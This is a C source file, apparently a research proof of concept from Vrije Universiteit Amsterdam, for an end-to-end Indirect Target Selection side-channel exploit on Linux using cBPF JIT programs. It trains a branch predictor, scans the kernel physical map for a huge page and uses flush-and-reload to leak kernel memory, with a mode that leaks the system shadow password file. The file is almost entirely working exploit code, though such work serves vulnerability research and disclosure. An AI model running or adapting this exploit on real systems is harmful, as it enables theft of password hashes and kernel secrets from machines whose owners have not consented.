/*
 * End-to-end ITS (Indirect Target Selection) exploit via cBPF
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#define _GNU_SOURCE

#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <signal.h>
#include <pthread.h>

#include "flush_and_reload.h"
#include "common.h"
#include "cbpf.h"

#define DEFAULT_SHADOW_SYMBOL '*'

void * thread_perform_attack(void * arg) {

    uint64_t hits;
    uint64_t iter;
    struct config * cfg = (struct config *) arg;

    pin_to_core(LEAK_CORE);

    insert_training_branch(cfg->train_address & (0xfffLU), cfg->train_target & (0xfffLU));

    for (size_t i = 0; i < 2; i++)
    {
         hits = do_flush_and_reload(cfg, 1000, 0);
         if (hits) {
            break;
         }
    }

    if (hits < 600) {
        if (hits > 1) {
            printf("Hits: %lu/1000 (%5.1f%%): Continuing... \n", hits, (double) hits / (double) 1000 * 100);
        }
        pthread_exit((void *) 1);
    }

    printf("\n------------------------------------------------------\n");
    printf("Hits: %lu/1000 (%5.1f%%)\n", hits, (double) hits / (double) 1000 * 100);
    printf("--> The branch is JITTED on a colliding address!\n");
    printf("--> Let's start leaking\n");

    for (size_t i = 0; i < 5; i++) {
        hits = do_flush_and_reload(cfg, 100000, 0);
        printf("Hits: %7lu/100000 (%5.1f%%)\n", hits, (double) hits / (double) 100000 * 100);
    }

    switch (cfg->leak_mode) {
    case 0:
        printf("================ Testing leakage rate ================\n");
        leak_test_leakage_rate(cfg);
        break;

    case 1:
        printf("============== Leaking a dummy secret =================\n");
        leak_dummy_secret(cfg);
        break;

    case 2:
        printf("================ Leaking the shadow file ===============\n");
        leak_shadow_file(cfg, DEFAULT_SHADOW_SYMBOL);
        break;

    default:
        break;
    }

    fflush(stdout);

}

int reinsert_training_branch(struct config * cfg, int times) {
    pthread_t tid;
    void *status;
    uint64_t idx = 0;


    cfg->fr_buf_kern = cfg->ind_map_kern + 0x2000;
    cfg->secret_addr_kern = cfg->ind_map_kern + 0x10000;

    set_load_chain_leak_secret(cfg);

    // comment/uncomment to search with non-zero secret
    *((uint32_t *) (cfg->ind_map + 0x10000)) = 0xdeadLU;
    *cfg->ind_base_addr = (uint64_t) cfg->fr_buf_kern - cfg->base_address_offset - (0xdeadLU << 4);

    for (size_t i = 0; i < times; i++)
    {
        pthread_create(&tid, NULL, thread_perform_attack, (void *)cfg);
        pthread_join(tid, &status);

        if (status == 0) {
            printf("Total reinsertion tries: %lu\n", idx);
            return 0;
        }
        idx++;

        fflush(stdout);
    }

    return 1;

}


void find_hp_kern_address_and_attack(struct config * cfg) {
    uint64_t mem_total = get_mem_total();
    uint64_t mem_used = get_mem_used();
    uint64_t offset;
    uint8_t * huge_page_kern;


    printf("===== Huge-page finding + Colliding cBPF Program ======\n");
    printf("--> We scan the physical map for the huge-page kernel address\n");
    printf("--> At the same time, we reinsert the cBPF with the training branch\n");
    printf("--> until the branch is placed at the correct colliding address\n");

    if (mem_total > (8LU * (1LU << 30))) {
        offset = (mem_total / 10) & ~(HUGE_PAGE_SIZE - 1);
        // never more than 4 GB
        if (offset > 4LU * (1LU << 30)) {
            offset = 4LU * (1LU << 30) & ~(HUGE_PAGE_SIZE - 1);
        }
    } else {
        offset = (mem_used / 4) & ~(HUGE_PAGE_SIZE - 1);
    }

    huge_page_kern = cfg->phys_start + offset;

#ifdef DEBUG
    uint8_t * ind_map_kern_real = (uint8_t *)(virt_to_physmap((uint64_t)cfg->ind_map, (uint64_t) cfg->phys_start));
    printf("   Verified kern address: %p (phys_map start + %2luGB) : %p\n", ind_map_kern_real, (ind_map_kern_real - cfg->phys_start) / (1 << 30), cfg->ind_map);
#endif

    // ------------------------------------------------------------------------
    // Start the huge page search
    uint64_t iter = 0;

    for (; huge_page_kern < cfg->phys_end; huge_page_kern += HUGE_PAGE_SIZE)
    {
        iter++;

        cfg->ind_map_kern = huge_page_kern;

        printf("\rTesting Kernel Huge Page: %p (phys_map start + %2luGB)", huge_page_kern, (huge_page_kern - cfg->phys_start) / (1 << 30));
        fflush(stdout);

        if(reinsert_training_branch(cfg, 10) == 0) {
            return;
        }

    }


}
